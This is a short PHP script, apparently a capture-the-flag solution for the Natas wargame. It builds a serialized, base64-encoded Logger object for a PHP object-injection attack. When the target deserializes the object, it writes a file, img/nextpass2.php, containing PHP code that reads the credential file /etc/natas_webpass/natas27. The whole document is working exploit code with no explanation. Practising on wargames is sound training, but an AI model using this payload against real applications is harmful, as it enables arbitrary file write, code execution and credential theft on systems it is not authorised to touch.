<?php
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct(){
            $this->initMsg="";
            $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
            $this->logFile = 'img/nextpass2.php';
        }

        function __destruct()
        {
            echo $this->logFile;
            echo $this->exitMsg;
        }
    }

    $obj = new Logger();
    echo base64_encode(serialize($obj));

?>
